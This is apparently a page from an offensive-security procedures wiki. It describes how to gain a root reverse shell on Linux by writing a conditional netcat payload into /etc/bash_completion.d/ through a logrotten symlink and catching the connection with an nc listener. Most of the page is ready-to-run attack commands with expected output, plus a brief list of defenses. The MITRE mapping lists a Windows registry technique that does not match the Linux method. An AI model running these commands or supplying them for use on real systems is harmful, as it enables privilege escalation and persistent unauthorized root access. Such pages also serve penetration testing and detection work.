---
id: proc-003
tags:
  - payload
  - reverse-shell
  - rootkit
  - linux
type: procedure
tools:
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/echo-deploy-payload]]'
  - '[[commands/nc-listen]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Registry Run Keys - Startup Folder]]'
updated_at: '2025-12-14T17:29:56.998Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Registry Run Keys - Startup Folder]]'
---
# Deploy-Reverse-Shell-Payload

## Summary

This procedure places a malicious bash completion script in the symlinked /etc/bash_completion.d/ directory, which executes a reverse shell as root upon login, and sets up a listener to receive the connection.

## Description

After symlinking, the rotated log file lands in /etc/bash_completion.d/, sourced by root's bash on login. The payload checks for uid=0 and spawns a netcat reverse shell to localhost:3333. Requires prior symlink success and nc availability. Outcome: Root shell connection when root logs in.

## Requirements

1. Successful symlink from logrotten
2. Write access to /etc/bash_completion.d/ via symlink
3. nc (netcat) installed
4. Localhost port 3333 free

## Defense

Defensive measures and detection strategies:

- Validate sourced files in /etc/bash_completion.d/ (e.g., remove .gz extensions or audit contents)
- Monitor unexpected files in /etc/ via file integrity monitoring (AIDE)
- Block or log netcat executions; use firewall to restrict localhost binds
- Disable root SSH login

## Objectives

1. Inject persistent root-executable code
2. Establish reverse shell mechanism
3. Await root trigger for escalation

## Instructions

### Step 1: Write Payload

**Context**: Create script that spawns shell if run as root.

**Command** ([[commands/echo-deploy-payload]]):
```bash
echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz
```

> Overwrites with conditional reverse shell. Expected output: File created/updated.

### Step 2: Start Listener

**Context**: Prepare to catch the incoming shell.

**Command** ([[commands/nc-listen]]):
```bash
nc -nvlp 3333
```

> Listens verbosely. Expected output: 'listening on [any] 3333 ...'

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell
- [[Registry Run Keys - Startup Folder]] .bash_profile and .bashrc

### Sub-Techniques


## Commands Used

- [[commands/echo-deploy-payload]]
- [[commands/nc-listen]]

## Tools Used

- [[tools/nc]]

## Tags

- [[payload]]
- [[reverse-shell]]
- [[Rootkit]]
- [[linux]]
